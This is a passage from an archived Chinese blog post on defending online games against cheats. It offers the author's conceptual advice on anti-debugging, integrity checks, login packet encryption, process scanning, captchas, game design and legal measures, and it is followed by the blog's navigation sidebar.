/>此类挂主要通过点卡、月卡等方式向普通玩家销售，一般海阔天空、外挂999、592外挂等外挂网站及淘宝都可见其踪影。</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈡打钱工作室<br />此类外挂由某工作室定制或只向工作室销售,由一个工作室买断,或少数工作室共用.</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">2反外挂杂谈<br />⑴一些常规反外挂关注点及个人建议<br />㈠脱机挂以及内挂开发首先必须解决游戏反调试保护,目前主流思想是驱动层进行调试器进程检测、标志位检测，HOOK重要函数等方法以及给游戏执行文件加猛壳利用壳的功能实现反调。<br />个人观点:驱动保护方法可大大提高外挂的制作门槛,但综合效果却并不是很好.驱动开发代价高昂、破坏游戏的兼容性和稳定性、对于专业的外挂团队根本无效.君不见DNF的玩家挂、工作室挂，AION的脱机挂依然很安逸地挂着.普通外挂开发团队或自己分析或通过购买工具方式解决驱动保护,顶尖的开发团队的技术人员可能比国内90%以上的游戏公司反挂技术人员都要多而且更专业解决驱动保护也是不在话下。有财力有技术实力的大公司可以加入驱动保护,中小游戏公司还是能免则免吧，简单的驱动起不到效果、复杂的驱动功能完善且兼容性、稳定性好可不是容易的事,况且底层的操作也不是必须的,相关的操作放到Ring3层处理、搞点猥琐手段效果亦不错.</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈡对游戏的启动参数进行加密（针对脱机挂及智能工作室内挂）.<br />个人建议: 启动参数加密是比较容易忽视的地方,加密函数中利用GetTickCount之类获取变参,灵活应用注册表或文件操作，判断游戏是否从官方程序启动,再对相关代码段VMP</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈢检测防多开（针对脱机挂及智能工作室内挂）<br />个人建议：多开检测也是比较容易忽视的地方,很多游戏只是一个简单的FindWindow、CreateMutex,有等于无，此处应多方法灵活处理，VMP依旧是必须的</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈣代码完整性校验<br />个人建议:CRC之类算法对自身的完整效验勾挂函数的完整效验,一些重要代码段另外单独校验，校验相关代码段VMP,必要的话返回服务器中验证</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈤游戏登陆相关封包处理<br />个人建议:游戏的登录封包尽量复杂化，不同的封包类型中部分数据采用多重加密是必要的，多个端口乱序通讯,这些登陆分包是一次性的不用太担心算法效率问题，而此操作却可以大大增加逆向难度;另简单说明一下,如很多游戏登陆会使用MD5进行相关验证,但多是直接对密码进行加密，逆向者用PEID 的Krypto ANALyzer知道用了这个算法,到网上随便找个MD5算法不用修改就能通过，效果甚微,而如果从服务器下发部分随机密钥A再与本地固定密钥B与密码组成密钥C再用MD5加密,在MD5加密的基础上再加个可逆算法处理，这样验证强度就强多了，本人初次逆这样个流程时候就觉得很痛苦，再VMP下，嘿嘿效果就达到了</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈥敌意进程、模块扫描<br />个人建议:可以多启线程进行相关操作,但放在主进程中扫描依旧是必须的，不需要太早扫描，不需要太频繁扫描，扫描结果返回值的多样化，扫描结果向服务器报告但在客户端是不需要立刻体现，此处灵活点，极尽猥琐，你可以很好的使用反外挂这把双刃剑,老规矩相关代码VMP.<br />外挂黑名单的获取:<br />A:玩家挂,直接搜索或购买<br />B:工作室挂,无间道、靠道友、声势浩大的反外挂奖励活动(这招效果不错,毕竟工作室的员工也想发笔横财,虽然不一定能拿到奖励&hellip;)<br />C:其它,多接触些有点名气的外挂代理</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈦客户端失去响应<br />个人建议: 一定时间客户端没有反应断开连接,这个时间能短就短,调试过的都知道，这样调试起来痛苦多了</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈧图片答题机制<br />个人观点:图片答题实现起来容易，却可以大大增加写外挂的难度、成本。<br />目前外挂应对方法<br />A：算法解析<br />B: 自建图库<br />C：人工答题(工作室挂一般都把图片传到指定答题机器上)<br />所以图片本身要处理的复杂点，噪点之类多多益善，基本断绝算法解析的希望;图片经常更新，或者写个小算法一个图片重复使用,让外挂的图库成为鸡肋，把外挂逼到人工答题这条路上,这样外挂难度、工作室成本就上去了,老规矩图片验证相关代码VMP。</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">⑵综合反外挂<br />曾经看到一个说法&ldquo;做外挂与反外挂技术上是对等的,完全靠技术手段是反不住外挂的,最好的反外挂系统是游戏本身&rdquo;,对此，我深表认同.反外挂应该从策划、技术、法律等多方面进行.<br />㈠策划方面:<br />RPG类个人比较推崇征途、剑侠类似的模式<br />A:打怪获取经验较低,游戏自带内挂,解决了很多没时间练级的玩家需求<br />（我就属于此类玩家，愿意花钱去玩游戏，但没空玩游戏，购买高级账号总是被无耻卖家找回,还搭上装备，默哀下&hellip;）；从反外挂的角度，我建议此类游戏内挂带最基本的挂机功能即可,吃药的、捡物的、技能的通通不带，应让此功能成为内挂开发者的鸡肋，不然开发内挂可就容易多了<br />B:<br />游戏中打怪、极大部分任务获取的游戏币是绑定的,绑定游戏币购买的物品同样是绑定的,可用于交易的货币只有有限的途径可以获取,目前我接触到得几个这类模式的游戏，工作室都是靠这些有限的途径打钱，官方一次大变动就可能导致外挂作者放弃或工作室放弃。<br />聪明的策划朋友们,发挥你的想象力，在游戏内容、游戏模式上多下功夫</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈡技术方面:<br />上面已经罗列了一些技术方面关注点,再者我认为单纯靠技术是防不住外挂的,就结合游戏、外挂再简单介绍下<br />游戏的交易、镶嵌、邮寄等系统必须严格检测:<br />现在的游戏市场竞争激烈,出现大的公开的此类漏洞可能直接毁掉游戏，若是自己公司开发的游戏,有可能的话直接代码层的审查，逻辑检测、溢出检查、对不正常的数据判断等等,对于无法看到代码的游戏通过逆向明文发包函数、分析出相关报文结构，用错误的逻辑、特殊处理的封包对这些系统进行完全检测（服务器是否可以对这些明显封包异常做些惩罚措施?）。<br />内挂多是注入DLL到游戏进程中，新起个外挂主线程，工作室内挂控制台的实现,可否根据其实现过程、特点(主窗口句柄类名、线程ID等等)做些对应措施?<br />除去服务器验证，游戏的另一张王牌强制更新是否妥善利用,内挂开<br />发者怕游戏更新什么、脱机挂开发者又怕游戏更新什么?<br />对于P2P类的网游,极尽你的能力在反调、随机函数保护、属性验证<br />方面下功夫吧，不然什么样的BT功能不能实现?</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈢法律方面:<br />在没有法律压力下，韩国游戏不是已经完全沦陷于国内外挂团队之手?让欧美游戏玩家惊呼hacker的背后又如何能缺得了国内外挂团队?国内外挂团队又何以如此嚣张?<br />游戏公司是否可以联合打击外挂介绍销售站点、外挂制作交流站点?<br />反外挂技术人员可以充分挖掘外挂的相关信息,必要时候请Police,若是能抓住个外挂开发者,效果是绝对震撼的.</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">结束语:<br />反外挂工作具有长期性，复杂性等特性，故建立专门进行此类工作的软件安全小组是必须的，及时的收集外挂后分析外挂所使用的技术和破解反外挂系统的方式，写出相应的检测及防护代码，提交后进行游戏更新。通过不断的完善游戏、完善反外挂系统，策划、法律多方面结合，我有理由坚信，外挂会在这样的保护措施下销声匿迹。</p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div>
					<div class="article-bottom" style="display: block">
						<div class="pages">
							<span class="pagebar-mainbody"> 分页： 1/5  <a href="index.php-go=category_57&mode=1&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=1"><img src="doubleleft.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/doubleleft.gif" alt="第一页" title="第一页" border="0"/></a> <span class="pagebar-selections"> <span class="pagelink-current">1</span>  <a href="read.php-6643.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=2">2</a>  <a href="read.php-6642.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=3">3</a>  <a href="read.php-6641.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=4">4</a>  <a href="read.php-6640.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=5">5</a> </span> <a href="read.php-6643.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=2"><img src="singleright.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/singleright.gif" alt="下页" title="下页" border="0"/></a>  <a href="read.php-6640.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=5"><img src="doubleright.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/doubleright.gif" alt="最后页" title="最后页" border="0"/></a> </span> [ 显示模式： <a href="index.php-go=category_57&mode=1&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=1" title="切换到摘要模式">摘要</a> | <a href="index.php-go=category_57&mode=2&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=2&page=1" title="切换到列表模式">列表</a> ]
						</div>
					</div>
				</div>
			</div>
		<div id="sidebar" class="sidebar">
			<div id="innerSidebar">
				<div id="innerSidebarSearch">
					<form method="post" action="http://i.renjihe.com/blog/visit.php">
	<input name="job" type="hidden" value="search"/>
	<input name="keyword" class="search-field" type="text"/>
	<select name="searchmethod"><option value="1">日志标题</option><option value="2">日志全文</option><option value="3">评论引用</option><option value="4">所有留言</option></select>
	<input value="搜索" class="button" type="submit"/>
	</form>
				</div>
				<div id="innerSidebarOne">
					<div id='panelCategory' class="panel">
<h5 style="cursor: pointer" onclick='showhidediv("sideblock_category");'>分类</h5>
<div class="panel-content" id="sideblock_category" style="display: block">
<ul><li><a href="index.php-go=category_1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_1" title="硬件">硬件</a> [1] <a href="feed.php-go=category_1" tppabs="http://i.renjihe.com/blog/feed.php?go=category_1"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_6.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_6" title="fpga/cpld">fpga/cpld</a> [10] <a href="feed.php-go=category_6" tppabs="http://i.renjihe.com/blog/feed.php?go=category_6"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_66.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_66" title="模电与电路">模电与电路</a> [1] <a href="feed.php-go=category_66" tppabs="http://i.renjihe.com/blog/feed.php?go=category_66"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_7.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_7" title="DSP">DSP</a> [14] <a href="feed.php-go=category_7" tppabs="http://i.renjihe.com/blog/feed.php?go=category_7"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_27.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_27" title="硬件知识">硬件知识</a> [26] <a href="feed.php-go=category_27" tppabs="http://i.renjihe.com/blog/feed.php?go=category_27"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_73.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_73" title="3D打印">3D打印</a> [1] <a href="feed.php-go=category_73" tppabs="http://i.renjihe.com/blog/feed.php?go=category_73"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_64.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_64" title="资讯">资讯</a> [18] <a href="feed.php-go=category_64" tppabs="http://i.renjihe.com/blog/feed.php?go=category_64"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_78.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_78" title="树莓派">树莓派</a> [5] <a href="feed.php-go=category_78" tppabs="http://i.renjihe.com/blog/feed.php?go=category_78"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="软件">软件</a> [0] <a href="feed.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/feed.php?go=category_2"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_9.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_9" title="linux">linux</a> [912] <a href="feed.php-go=category_9" tppabs="http://i.renjihe.com/blog/feed.php?go=category_9"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_14.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_14" title="QT">QT</a> [131] <a href="feed.php-go=category_14" tppabs="http://i.renjihe.com/blog/feed.php?go=category_14"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_82.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_82" title="Lua">Lua</a> [15] <a href="feed.php-go=category_82" tppabs="http://i.renjihe.com/blog/feed.php?go=category_82"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_15.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_15" title="Android">Android</a> [261] <a href="feed.php-go=category_15" tppabs="http://i.renjihe.com/blog/feed.php?go=category_15"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_65.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_65" title="Iphone">Iphone</a> [48] <a href="feed.php-go=category_65" tppabs="http://i.renjihe.com/blog/feed.php?go=category_65"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_32.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_32" title="windows">windows</a> [61] <a href="feed.php-go=category_32" tppabs="http://i.renjihe.com/blog/feed.php?go=category_32"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_31.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_31" title="webkit">webkit</a> [79] <a href="feed.php-go=category_31" tppabs="http://i.renjihe.com/blog/feed.php?go=category_31"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_10.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_10" title="C/C++">C/C++</a> [98] <a href="feed.php-go=category_10" tppabs="http://i.renjihe.com/blog/feed.php?go=category_10"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_29.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_29" title="lisp、Erlang">Erlang、Lisp</a> [28] <a href="feed.php-go=category_29" tppabs="http://i.renjihe.com/blog/feed.php?go=category_29"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_46.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_46" title="Python">Python</a> [255] <a href="feed.php-go=category_46" tppabs="http://i.renjihe.com/blog/feed.php?go=category_46"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_18.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_18" title="Java">Java</a> [25] <a href="feed.php-go=category_18" tppabs="http://i.renjihe.com/blog/feed.php?go=category_18"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_13.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_13" title="web">web</a> [486] <a href="feed.php-go=category_13" tppabs="http://i.renjihe.com/blog/feed.php?go=category_13"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_50.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_50" title="测试">测试</a> [12] <a href="feed.php-go=category_50" tppabs="http://i.renjihe.com/blog/feed.php?go=category_50"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_23.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_23" title="源码分析">源码分析</a> [85] <a href="feed.php-go=category_23" tppabs="http://i.renjihe.com/blog/feed.php?go=category_23"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_19.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_19" title="编译原理">编译原理</a> [82] <a href="feed.php-go=category_19" tppabs="http://i.renjihe.com/blog/feed.php?go=category_19"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_83.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_83" title="黑客">黑客</a> [4] <a href="feed.php-go=category_83" tppabs="http://i.renjihe.com/blog/feed.php?go=category_83"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_39.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_39" title="GPU编程">GPU编程</a> [89] <a href="feed.php-go=category_39" tppabs="http://i.renjihe.com/blog/feed.php?go=category_39"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_48.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_48" title="OpenGL">OpenGL</a> [117] <a href="feed.php-go=category_48" tppabs="http://i.renjihe.com/blog/feed.php?go=category_48"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_52.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_52" title="OpenCV">OpenCV</a> [18] <a href="feed.php-go=category_52" tppabs="http://i.renjihe.com/blog/feed.php?go=category_52"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_20.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_20" title="音视频与流媒体">音视频与流媒体</a> [412] <a href="feed.php-go=category_20" tppabs="http://i.renjihe.com/blog/feed.php?go=category_20"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_62.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_62" title="游戏">游戏</a> [455] <a href="feed.php-go=category_62" tppabs="http://i.renjihe.com/blog/feed.php?go=category_62"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_54.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_54" title="FLEX&AS">FLEX&amp;AS</a> [124] <a href="feed.php-go=category_54" tppabs="http://i.renjihe.com/blog/feed.php?go=category_54"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_61.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_61" title="编程杂项">编程杂项</a> [55] <a href="feed.php-go=category_61" tppabs="http://i.renjihe.com/blog/feed.php?go=category_61"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="网络安全"><strong>网络安全</strong></a> [43] <a href="feed.php-go=category_57" tppabs="http://i.renjihe.com/blog/feed.php?go=category_57"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_28.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_28" title="软件工程">软件工程</a> [40] <a href="feed.php-go=category_28" tppabs="http://i.renjihe.com/blog/feed.php?go=category_28"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_74.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_74" title="并行编程">并行编程</a> [4] <a href="feed.php-go=category_74" tppabs="http://i.renjihe.com/blog/feed.php?go=category_74"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_77.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_77" title="大数据">大数据</a> [10] <a href="feed.php-go=category_77" tppabs="http://i.renjihe.com/blog/feed.php?go=category_77"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_37.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_37" title="理论">理论</a> [0] <a href="feed.php-go=category_37.htm" tppabs="http://i.renjihe.com/blog/feed.php?go=category_37"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_38.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_38" title="数学">数学</a> [75] <a href="feed.php-go=category_38" tppabs="http://i.renjihe.com/blog/feed.php?go=category_38"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_43.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_43" title="物理">物理</a> [19] <a href="feed.php-go=category_43" tppabs="http://i.renjihe.com/blog/feed.php?go=category_43"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_24.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_24" title="算法">算法</a> [80] <a href="feed.php-go=category_24" tppabs="http://i.renjihe.com/blog/feed.php?go=category_24"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_40.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_40" title="音频处理">音频处理</a> [3] <a href="feed.php-go=category_40" tppabs="http://i.renjihe.com/blog/feed.php?go=category_40"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_36.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_36" title="CV&Graphic">CV&amp;Graphic</a> [183] <a href="feed.php-go=category_36" tppabs="http://i.renjihe.com/blog/feed.php?go=category_36"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li class="indent"><a href="index.php-go=category_35.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_35" title="AR&AI&模式识别">AR&amp;AI&amp;模式识别</a> [127] <a href="feed.php-go=category_35" tppabs="http://i.renjihe.com/blog/feed.php?go=category_35"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_26.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_26" title="工具">工具</a> [56] <a href="feed.php-go=category_26" tppabs="http://i.renjihe.com/blog/feed.php?go=category_26"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_3.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_3" title="新鲜玩意">新鲜玩意</a> [446] <a href="feed.php-go=category_3" tppabs="http://i.renjihe.com/blog/feed.php?go=category_3"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_63.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_63" title="行业应用">行业应用</a> [6] <a href="feed.php-go=category_63" tppabs="http://i.renjihe.com/blog/feed.php?go=category_63"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_4.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_4" title="资讯">资讯</a> [137] <a href="feed.php-go=category_4" tppabs="http://i.renjihe.com/blog/feed.php?go=category_4"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_12.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_12" title="网文">网文</a> [622] <a href="feed.php-go=category_12" tppabs="http://i.renjihe.com/blog/feed.php?go=category_12"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_41.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_41" title="点子正传">点子正传</a> [20] <a href="feed.php-go=category_41" tppabs="http://i.renjihe.com/blog/feed.php?go=category_41"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_56.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_56" title="理财">理财</a> [24] <a href="feed.php-go=category_56" tppabs="http://i.renjihe.com/blog/feed.php?go=category_56"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_55.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_55" title="收集">收集</a> [157] <a href="feed.php-go=category_55" tppabs="http://i.renjihe.com/blog/feed.php?go=category_55"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_71.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_71" title="创业">创业</a> [405] <a href="feed.php-go=category_71" tppabs="http://i.renjihe.com/blog/feed.php?go=category_71"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_80.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_80" title="共享软件">共享软件</a> [12] <a href="feed.php-go=category_80" tppabs="http://i.renjihe.com/blog/feed.php?go=category_80"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_72.htm" 